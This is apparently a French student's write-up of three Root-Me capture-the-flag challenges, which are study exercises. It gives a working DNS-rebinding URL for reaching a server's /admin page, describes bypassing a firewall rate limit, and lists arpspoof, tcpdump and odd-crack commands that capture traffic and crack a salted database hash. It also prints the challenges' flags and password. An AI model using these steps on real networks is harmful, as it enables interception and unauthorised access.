# TP6 : Un peu de root-me

## I. DNS Rebinding

🌞 **Write-up de l'épreuve**

## Découverte du challenge

Nous sommes confrontés à un serveur qui récupère le contenu d'une URL qui lui est envoyée. Nous devons réussir à récupérer ce qu'affiche la page `/admin`

## Détail de l'attaque

On peut effectuer une attaque DNS rebinding. On a besoin d'un serveur DNS avec un TTL très bas, voire nul. Cela nous permettra de suivre la procédure suivante :

1. Envoi de l'URL avec un nom de domaine choisi pour l'attaque.
2. Le serveur vérifie la localité du nom de domaine fourni. À ce stade, le DNS renvoie une adresse IP publique.
3. Le serveur effectue une requête GET vers l'URL avec le nom de domaine fourni. Le DNS renvoie 127.0.0.1 lorsqu'il reçoit la demande de résolution.

## Résolution de l'attaque

J'ai utilisé ce service de DNS rebinding : [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Nous créons un nom de domaine pour résoudre les adresses IP suivantes : 127.0.0.1 et 216.58.215.46.

J'obtiens l'adresse IP de google grace à cette commande :
```
fmaxance@ZeyKiiPC:~$ wget --spider google.com
Spider mode enabled. Check if remote file exists.
--2023-12-07 11:48:48--  http://google.com/
Resolving google.com (google.com)... 216.58.215.46, 2a00:1450:4007:808::200e
Connecting to google.com (google.com)|216.58.215.46|:80... connected.
```

Le nom de domaine obtenu : `7f000001.d83ad72e.rbndr.us`

On envoi ensuite au site web l'URL suivante à récupérer :
`http://7f000001.d83ad72e.rbndr.us:54022/admin`

Sans oublier de préciser le port `54022` et la page `/admin`

## Conclusion de l'attaque

En résumé, l'utilisation du DNS rebinding, avec l'aide d'un service accessible comme [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html), permet de contourner les restrictions imposées par le serveur. En créant un nom de domaine spécifique, on réussi à faire en sorte que le serveur pense que la requête provient de localhost, nous permettant ainsi d'accéder au flag.

## II. Netfilter erreurs courantes

🌞 **Write-up de l'épreuve**

## Découverte du challenge

Le défi impliquait la récupération des règles d'un pare-feu d'un serveur web et de trouver des failles dans la configuration. Nous devons réussir à récupérer le `flag`

## Détail de l'attaque

En analysant ces règles, on remarque l'utilisation de l'option --limit-burst dans la règle du pare-feu, ce qui limite le nombre de requêtes autorisées.
```
IP46T -A INPUT-HTTP -m limit —limit 3/sec —limit-burst 20 -j DROP
IP46T -A INPUT-HTTP -j ACCEPT
```

## Résolution de l'attaque

Pour contourner cette limitation, on utilise des threads en Python pour effectuer simultanément 22 requêtes vers le serveur. Chaque thread initie une connexion HTTP vers le port spécifié et affiche uniquement la dernière réponse reçue, évitant ainsi d'attendre les autres réponses.

Voici le code utilisé :
[netfilter](netfilter.py)

## Conclusion de l'attaque

Finalement, on réussi à obtenir le flag en exploitant les limitations du pare-feu.

## III. ARP Spoofing Ecoute active

🌞 **Write-up de l'épreuve**

## Découverte du challenge

Le défi impliquait la récupération d'informations confidentielles qui transitent sur un réseau donné. On a donc accès à un LAN via une machine qu'on contrôle. Nous devons réussir à récupérer deux `flag`. La concaténation de la réponse à une requête sur le réseau, ainsi que le mot de passe de la base de données forme le bon mot de passe de l'épreuve.

## Détail de l'attaque

On commence par faire un scan du réseau afin de comprendre quelle machine existe et quel service tourne. On installe donc quelque outil utile `nmap, netools, iproute2, iputils-ping`.

```
	Nmap scan report for 172.18.0.1
	Host is up (0.000033s latency).
	MAC Address: 02:42:A8:F3:06:A5 (Unknown)
	Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.3)
	Host is up (0.000031s latency).
	MAC Address: 02:42:AC:12:00:03 (Unknown)
	Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.4)
	Host is up (0.000039s latency).
	MAC Address: 02:42:AC:12:00:04 (Unknown)
	Nmap scan report for fac50de5d760 (172.18.0.2)
	Host is up.
```

On découvre deux machines :

`db.arp-spoofing-dist-2_default (172.18.0.3)` avec le port 3306 ouvert qui fait tourner `mysql`

`client.arp-spoofing-dist-2_default (172.18.0.4)` avec aucun port ouvert.

---

On install par réflexe `mysql-client`

On essaye donc de se connecter à la DB :
`mysql -h 172.18.0.3`

Logique ça demande un mdp qu'on a pas...
On peut alors se diriger vers un `ARP Spoofing` pour capturer des trames sur le réseau entre les deux machines (d'ou le titre de l'épreuve ARP Spoofing Ecoute active)

On install l'outil `dsniff` puis on lance un ARP Spoofing :

```
arpspoof -t 172.18.0.4 172.18.0.3
arpspoof -t 172.18.0.3 172.18.0.4
```

Puis on scan le réseau afin de réaliser un dump des trames capturé, on install l'outil `tcpdump` :

```
tcpdump -nn -n -v 'not host 195.7.117.146' -w io.pcap
```

On peut du coup logiquement check le fichier `io.pcap` en temps réel afin de détécter si on capture un nombre de trame au dessus de deux par deux. Car logiquement on envoi 2 trames par 2 trames avec l'arpspoof. DONC si on voit que dans l'incrémentation on voit un `+3` C'EST qu'on a choppé un truc intéréssant. On utilise `tail` :

```
tail -f io.pcap
```

Une fois ça finis on copy en ssh ce fichier afin de l'analyser sur notre machine perso avec wireshark :

```
scp -P 22222 root@ctf15.root-me.org:/root/io.pcap .
```

En analysant les trames capturer on trouve rapidement dans les data le premier flag : `l1tter4lly_4_c4ptur3_th3_fl4g`

Puis on trouve aussi le Password !
Ahaha c'est un hash...

`33e8f543f1995475aab52f424b1333d3e3bb8b06`

Bon bah go chercher le bonne outil pour comprendre ce truc, sachant qu'un hash est par définition à sens unique donc irréverssible. MAIS on peut comparer ce hash avec des hash d'une wordlist afin de renvoyer le bon mot derrière.

On s'aperçoit vite qu'il y a du SEL au début de ce hash pour maximiser la sécu et faire en sorte que rien ne se ressemble mais en cherchant le bonne outil on tombe sur ce GitHub :
https://github.com/kazkansouh/odd-hash

On a donc ces infos :

    salt1 : "#Yp'?7." soit "235970273f375c2e" en héxa
    
    salt2 : "}Q?&\034`>Nt_uX" soit "7d513f261c603e4e745f7558" en héxa

    Double salt hex : 235970273f375c2e7d513f261c603e4e745f7558

On a tout pour utiliser l'outil plus haut :

```
fmaxance@ZeyKiiPC:~/Repo/RootMe/Wordlists$ odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:235970273f375c2e7d513f261c603e4e745f7558 rockyou.txt 33e8f543f1995475aab52f424b1333d3e3bb8b06
[*] loading file...
[*] found heyheyhey=33e8f543f1995475aab52f424b1333d3e3bb8b06
[*] all hashes found, shutdown requested
[*] done, tried 4700 passwords
```

ET BIM ! Le mdp c'est `heyheyhey`

On fait donc la concaténation du premier flag et de ce mdp et on a le flag entier : `l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey`

## Conclusion de l'attaque

Pour conclure, le défi ARP Spoofing Ecoute active consistait à récupérer des informations confidentielles sur un réseau. Après avoir identifié deux machines, une attaque ARP Spoofing a été utilisée pour capturer des trames réseau. 

En analysant ces trames, on découvre le premier flag et un mot de passe hashé. En déchiffrant le mot de passe avec l'outil odd-hash, on obtient le mot de passe heyheyhey. 

La concaténation du premier flag avec ce mot de passe a donné le flag final : l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey.